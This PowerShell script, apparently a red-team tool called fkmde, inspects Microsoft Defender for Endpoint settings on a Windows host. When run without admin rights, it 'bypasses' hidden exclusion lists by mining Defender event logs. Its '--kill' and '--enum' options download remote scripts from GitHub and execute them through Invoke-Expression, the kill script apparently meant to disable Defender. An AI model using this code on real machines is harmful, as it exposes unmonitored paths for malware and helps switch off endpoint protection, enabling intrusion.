param (
    [string]$Action,
    [string]$Path = "C:\Windows",  # Default path for --enum
    [int]$Depth = 1  # Default depth if not provided
)

$banner = @'

      _____         _____         _____         _____         _____
    .'     '.     .'     '.     .'     '.     .'     '.     .'     '.
   /  o   o  \   /  o   o  \   /  o   o  \   /  o   o  \   /  o   o  \
  |           | |           | |           | |           | |           |
  |  \     /  | |  \     /  | |  \     /  | |  \     /  | |  \     /  |
   \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /
    '._____.'     '._____.'     '._____.'     '._____.'     '._____.'       

   fkmde by @fkxdr
   https://github.com/fkxdr/fkmde

   
'@

Write-Host $banner -ForegroundColor DarkGray

if (-not $Action) {
      Write-Host "Checking device configuration..."
      Write-Host ""
      
      # Review if command is run as admin
      function IsAdmin {
          $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
          return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
      }
      
      # Get Windows Defender Real-Time Protection status
      $DefenderPreferences = Get-MpPreference
      $DefenderStatus = Get-MpComputerStatus
      Write-Host "Antivirus Engine Version :                                    $($DefenderStatus.AMEngineVersion )" -ForegroundColor Green
      Write-Host "Antivirus Product Version :                                   $($DefenderStatus.AMProductVersion)" -ForegroundColor Green
      Write-Host ""
      try {
          if ($defenderStatus.RealTimeProtectionEnabled -eq $true) {
              Write-Host "Real-Time Protection :                                        [OK] Enabled" -ForegroundColor Green
          } else {
              Write-Host "[6] Real-Time Protection :                                        [KO] $($DefenderStatus.RealTimeProtectionEnabled)" -ForegroundColor DarkRed
              $RealTimeProtectionDisabled = $true
          }
      } catch [System.Exception] {
          Write-Host "[E] Real-Time Protection :                                        [??] The status is unknown." -ForegroundColor DarkYellow
          $RealTimeProtectionDisabled = $true
      }
      
      # MDE Sensor status
      try {
          $MDEservice = Get-Service -Name "Sense" -ErrorAction Stop
          $MDEstatus = $MDEservice.Status
      
          if ($MDEstatus -eq "Running") {
              Write-Host "Microsoft Defender for Endpoint Sensor :                      [OK] Enabled" -ForegroundColor Green
          } elseif ($MDEstatus -eq "Stopped") {
              Write-Host "Microsoft Defender for Endpoint Sensor :                      [KO] Disabled" -ForegroundColor DarkRed
              $MDENotRunning = $true
          }
      } catch {
          Write-Host "Microsoft Defender for Endpoint Sensor :                      [??] No Sense found" -ForegroundColor DarkYellow
          $MDENotRunning = $true
      }
      
      # MDE Network Protection status
      try {
          $NetworkProtectionValue = (Get-MpPreference).EnableNetworkProtection
          
          if ($NetworkProtectionValue -eq 1) {
              Write-Host "Microsoft Defender for Endpoint Network Protection :          [OK] Enabled" -ForegroundColor Green
          } elseif ($NetworkProtectionValue -eq 0) {
              Write-Host "Microsoft Defender for Endpoint Network Protection :          [KO] Disabled" -ForegroundColor DarkRed
              $NPDisabled = $true
          } elseif ($NetworkProtectionValue -eq 2) {
              Write-Host "Microsoft Defender for Endpoint Network Protection :          [OK] Audit" -ForegroundColor Green
          }
      } catch [System.Exception] {
          Write-Host "Microsoft Defender for Endpoint Network Protection :          [??] The status is unknown" -ForegroundColor DarkYellow
          $NPDisabled = $true
      }
      
      # Microsoft Edge SmartScreen policy settings
      $edgeSSvalue = $null
      $policyPaths = @(
          "HKLM:\SOFTWARE\Policies\Microsoft\Edge",
          "HKCU:\SOFTWARE\Policies\Microsoft\Edge"
      )
      foreach ($path in $policyPaths) {
          if (Test-Path $path) {
              try {
                  $edgeSSvalue = Get-ItemPropertyValue -Path $path -Name "SmartScreenEnabled" -ErrorAction Stop
                  break
              } catch {}
          }
      }
      if ($edgeSSvalue -eq 0) {
          Write-Host "Microsoft Edge SmartScreen :                                  [KO] Disabled" -ForegroundColor DarkRed
      } else {
          Write-Host "Microsoft Edge SmartScreen :                                  [OK] Enabled" -ForegroundColor Green
      }
      
      # Tamper Protection status
      $TamperProtectionStatus = $DefenderStatus.IsTamperProtected
      $TamperProtectionManage = $DefenderStatus.TamperProtectionSource
      
      # Confirm if Tamper Protection is enabled or disabled
      if ($TamperProtectionStatus -eq $true) {
          Write-Host "Tamper Protection Status :                                    [OK] Enabled" -ForegroundColor Green
      } elseif ($TamperProtectionStatus -eq $false) {
          Write-Host "Tamper Protection Status :                                    [KO] Disabled" -ForegroundColor DarkYellow
      } else {
          Write-Host "Tamper Protection Status :                                    [??] Unknown - $tpStatus"  -ForegroundColor DarkYellow
      }
      
      # Confirm if Tamper Protection is managed by Microsoft or other
      if ($TamperProtectionManage -eq "Intune") {
          Write-Host "Tamper Protection Source :                                    [OK] Intune" -ForegroundColor Green
      } elseif ($TamperProtectionManage -eq "ATP") {
          Write-Host "Tamper Protection Source :                                    [OK] MDE Tenant" -ForegroundColor Green
      } else {
          Write-Host "Tamper Protection Source :                                    [??] Unknown - $TamperProtectionManage"  -ForegroundColor DarkYellow
      }
      
      # Checking IOAV Protection
      if (-not $DefenderPreferences.DisableIOAVProtection) {
          Write-Host "IOAV Protection :                                             [OK] Enabled" -ForegroundColor Green
      } else {
          Write-Host "IOAV Protection :                                             [KO] Disabled" -ForegroundColor DarkRed
      }
      
      # Checking Email Scanning
      if (-not $DefenderPreferences.DisableEmailScanning) {
          Write-Host "Email Scanning :                                              [OK] Enabled" -ForegroundColor Green
      } else {
          Write-Host "Email Scanning :                                              [KO] Disabled" -ForegroundColor DarkRed
      }
      
      # Checking Realtime Monitoring
      if (-not $DefenderPreferences.DisableRealtimeMonitoring) {
          Write-Host "Realtime Monitoring :                                         [OK] Enabled" -ForegroundColor Green
      } else {
          Write-Host "Realtime Monitoring :                                         [??] Disabled" -ForegroundColor DarkRed
      }
      
      # Checking Behavior Monitoring
      if (-not $DefenderPreferences.DisableBehaviorMonitoring) {
          Write-Host "Behavior Monitoring :                                         [OK] Enabled" -ForegroundColor Green
      } else {
          Write-Host "Behavior Monitoring :                                         [??] Disabled" -ForegroundColor DarkRed
      }
      
      # Check Microsoft Defender Exclusions
      Write-Host ""
      function Check-Exclusions {
          param ($exclusions)
          if ($exclusions -eq $exclusions -like "*N/A: Must be an administrator to view exclusions*") {
              return "[ERROR] No permissions to view exclusions"
          } elseif ($exclusions.Count -eq 0) {
              return "[OK] No exclusions were found"
          } else {
              return "[NG] Exclusions were found"
          }
      }
      
      # Checking Exclusion Extensions when Admin
      if (IsAdmin) {
          # Exclusion Extensions
          $exclusionExtensions = $DefenderPreferences.ExclusionExtension
          if ($exclusionExtensions -eq $null -or $exclusionExtensions.Count -eq 0) {
              Write-Host "Exclusion Extensions :                                        [OK] No exclusions were found" -ForegroundColor Green
          } else {
              Write-Host "Exclusion Extensions :                                        [NG] Exclusions found" -ForegroundColor DarkRed
              foreach ($extension in $exclusionExtensions) {
                  Write-Host "  - $extension"
              }
          }
          
          # Exclusion Paths
          $exclusionPaths = $DefenderPreferences.ExclusionPath
          if ($exclusionPaths -eq $null -or $exclusionPaths.Count -eq 0) {
              Write-Host "Exclusion Paths :                                             [OK] No exclusions were found" -ForegroundColor Green
          } else {
              Write-Host "Exclusion Paths :                                             [NG] Exclusions found" -ForegroundColor DarkRed
              foreach ($path in $exclusionPaths) {
                  Write-Host "  - $path"
              }
          }
      
          # Exclusion Processes
          $exclusionProcesses = $DefenderPreferences.ExclusionProcess
          if ($exclusionProcesses -eq $null -or $exclusionProcesses.Count -eq 0) {
              Write-Host "Exclusion Processes :                                         [OK] No exclusions were found" -ForegroundColor Green
          } else {
              Write-Host "Exclusion Processes :                                         [NG] Exclusions found" -ForegroundColor DarkRed
              foreach ($process in $exclusionProcesses) {
                  Write-Host "  - $process"
              }
          }
      }
      
      
      # Bypass locked Exclusions by checking in Windows Events 5007 if not Admin
      if (-not (IsAdmin)) {
          Write-Host "Missing permissions. Attempting to bypass exclusion list..."
          $LogName = "Microsoft-Windows-Windows Defender/Operational"
          $EventID = 5007
          $Pattern = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\([^`"]+)"
          $foundExclusions = $false
          $ExclusionEvents = Get-WinEvent -LogName $LogName | Where-Object { $_.Id -eq $EventID -and $_.Message -match "Exclusions" }
          
          foreach ($Event in $ExclusionEvents) {
              if ($Event.Message -match $Pattern) {
                  Write-Host "  - $($Matches[1])"
                  $foundExclusions = $true
              }
          }
          if (-not $foundExclusions) {
              Write-Host "Bypassed Exclusions:                                          [OK] No exclusions were found" -ForegroundColor Green
          }
       }   
      
      # Check ASR rules status
      $asrRulesDefinitions = @{
          "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550" = "Block executable content from email client and webmail :     ";
          "D4F940AB-401B-4EFC-AADC-AD5F3C50688A" = "Block all Office applications from creating child processes :";
          "3B576869-A4EC-4529-8536-B80A7769E899" = "Block Office applications from creating executable content : ";
          "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84" = "Block Office apps from injecting code into processes :       ";
          "D3E037E1-3EB8-44C8-A917-57927947596D" = "Block JS or VBS from running downloaded executable content : ";
          "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" = "Block execution of potentially obfuscated scripts :          ";
          "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B" = "Block Win32 API calls from Office macros :                   ";
          "01443614-cd74-433a-b99e-2ecdc07bfc25" = "Block executable files unless they meet prevalence or age :  ";
          "c1db55ab-c21a-4637-bb3f-a12568109d35" = "Use advanced protection against ransomware :                 ";
          "9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2" = "Block credential stealing from lsass.exe :                   ";
          "d1e49aac-8f56-4280-b9ba-993a6d77406c" = "Block process creations from PSExec and WMI commands :       ";
          "b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4" = "Block untrusted and unsigned processes that run from USB :   ";
          "26190899-1602-49e8-8b27-eb1d0a1ce869" = "Block Office application from creating child processes :     ";
          "7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c" = "Block Adobe Reader from creating child processes :           ";
          "e6db77e5-3df2-4cf1-b95a-636979351e5b" = "Block persistence through WMI event subscription :           ";
          "56a863a9-875e-4185-98a7-b882c64b5ce5" = "Block abuse of exploited vulnerable signed drivers :         ";
          "33ddedf1-c6e0-47cb-833e-de6133960387" = "Block rebooting machine in Safe Mode (preview) :             ";
          "c0033c00-d16d-4114-a5a0-dc9b3a7d2ceb" = "Block use of copied or impersonated system tools (preview) : ";
          "a8f5898e-1dc8-49a9-9878-85004b8a61e6" = "Block Webshell creation for Servers :                        ";
      }
      
      Write-Host ""
      if (IsAdmin) {
          $asrStatuses = Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
          $asrRuleGuids = Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
      
          for ($i = 0; $i -lt $asrRuleGuids.Count; $i++) {
              $ruleName = $asrRulesDefinitions[$asrRuleGuids[$i]]
              $statusDescription = switch ($asrStatuses[$i]) {
                  0 { "[KO] Disabled" }
                  1 { "[OK] Enabled" }
                  2 { "[??] Audit" }
                  Default { "Unknown" }
              }
              $color = switch ($asrStatuses[$i]) {
                  1 { "Green" }
                  2 { "DarkYellow" }
                  Default { "DarkRed" }
              }
              if ($ruleName) {
                  Write-Host "$ruleName $statusDescription" -ForegroundColor $color
              } else {
                  Write-Host "ASR Rules :                                                   [KO] Disabled" -ForegroundColor $color
              }
          }
      } 
      # Check ASR rules exclusions
      if (IsAdmin) {
          $asrExclusionEntries = @()
          for ($i = 0; $i -lt $DefenderPreferences.AttackSurfaceReductionRules_RuleSpecificExclusions.Count; $i++) {
              $asrExclusionEntries += [PSCustomObject]@{
                  RuleID = $DefenderPreferences.AttackSurfaceReductionRules_RuleSpecificExclusions_Id[$i]
                  ExclusionPaths = $DefenderPreferences.AttackSurfaceReductionRules_RuleSpecificExclusions[$i]
              }
          }
      
          if ($asrExclusionEntries.Count -gt 0) {
              foreach ($entry in $asrExclusionEntries) {
                  $ruleName = $asrRulesDefinitions[$entry.RuleID]
                  if ($entry.ExclusionPaths) {
                      Write-Host "`n$ruleName [KO] Exclusions found" -ForegroundColor DarkRed
                      $paths = $entry.ExclusionPaths -split '\|'
                      foreach ($path in $paths) {
                          Write-Host "  - $path"
                      }
                  }
              }
          } else {
              Write-Host "ASR Exclusions:                                               [OK] No exclusions were found" -ForegroundColor Green
          }
      } 
      
      # Attempting to bypass ASR rules 
      if (-not (IsAdmin)) {
          Write-Host "Missing permissions. Attempting to bypass ASR rules..."
          $LogName = "Microsoft-Windows-Windows Defender/Operational"
          $EventID = 1121
          $displayedRules = @{}
      
          try {
              $ASREvents = Get-WinEvent -LogName $LogName -FilterXPath "*[System[EventID=$EventID]]" -ErrorAction Stop
              if ($ASREvents) {
                  foreach ($event in $ASREvents) {
                      if ($event.Message -match 'ID: ([\w\-]+)') {
                          $asrID = $matches[1]
                          $ruleName = $asrRulesDefinitions[$asrID]
                          if ($ruleName -and -not $displayedRules[$ruleName]) {
                              Write-Host "$ruleName [OK] Enabled" -ForegroundColor Green
                              $displayedRules[$ruleName] = $true
                          }
                      }
                  }
              }
          } catch {
              # No ASR Rules in event logs
          }
      }
    exit
}

# Function to execute external scripts in /additional repo
function Run-ScriptFromURL {
    param (
        [string]$url
    )
    try {
        $scriptContent = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
        Invoke-Expression $scriptContent
    }
    catch {
        Write-Host "Failed to download or run the script from $url"
    }
}

# Handle the different options
switch ($Action) {
    '--kill' {
        Write-Host "Executing kill script..."
        Run-ScriptFromURL "https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/additional/kill.ps1"
    }
    '--enum' {
        # Check if the first argument after --enum is numeric (depth), or if it's a valid path
        if ($args.Count -ge 1) {
            if ($args[0] -as [int]) {
                $Depth = $args[0]
            } elseif (Test-Path $args[0]) {
                $Path = $args[0]
                if ($args.Count -ge 2 -and $args[1] -as [int]) {
                    $Depth = $args[1]
                }
            }
        }
        
        Write-Host "Executing enumeration script..."
        Write-Host "Enumerating directory: $Path with depth $Depth"
        Run-ScriptFromURL "https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/additional/enum.ps1"
    }
    default {
        Write-Host "Invalid argument. Use --kill or --enum <path> [depth]."
    }
}
